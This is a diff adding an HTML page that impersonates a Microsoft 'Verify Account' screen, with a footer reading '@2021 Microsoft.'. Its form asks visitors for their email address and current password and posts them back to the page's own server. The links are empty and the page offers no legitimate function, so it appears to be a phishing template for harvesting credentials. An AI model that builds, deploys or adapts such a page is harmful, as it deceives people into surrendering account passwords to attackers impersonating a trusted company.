@@ -1,0 +1,73 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Sign in to verify</title>
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<style type="text/css">
+		*{
+			margin: 0px auto;
+			padding: 0px;
+			font-family: sans-serif;
+			font-size: 13px;
+		}
+		a{
+			text-decoration: none;
+		}
+		.title{
+			height: 30px;
+
+		}
+		.background{
+			background: #ffffff;
+			text-align: center;
+			height: 650px;
+		}
+		.Verify{
+			font-size: 30px;
+		}
+		.Email,.Password,.submit{
+			padding: 5px;
+			border-radius: 5px;
+			margin: 5px;
+			height: 35px;
+			width: 90%;
+			max-width: 700px;
+		}
+		.submit{
+			border: none;
+			background: #757de8;
+			border-radius: 5px;
+			outline: none;
+			font-weight: bold;
+			font-size: 20px;
+			width: 200px;
+		}
+		.submit:active{
+			background: #002984
+		}
+		.policy{
+			display: table;
+		}
+		.terms{
+			margin-right: 40px;
+		}
+	</style>
+</head>
+<body>
+	<div class="background"><br><br>
+		<div><img class="title" src="logo.jpg"></div><br><br><br><br>
+		<div class="Verify">Verify Account</div><br><br><br>
+		<div>Confirm your email address</div><br><br>
+		<form method="post" onsubmit="return validate();">
+			<div><input type="email" name="Email" class="Email" placeholder="Enter your email address"></div>
+			<div><input type="password" name="Password" class="Password" placeholder="Enter your current password"></div>
+			<div><input type="submit" name="submit" value="Confirm" class="submit"></div>
+		</form><br><br><br>
+		<div class="policy"><a class="terms" href="">Terms of use</a> <a href="">Privacy and cookies</a></div><br><br>
+		<div>@2021 Microsoft.</div>
+	</div>
+</body>
+</html>
+
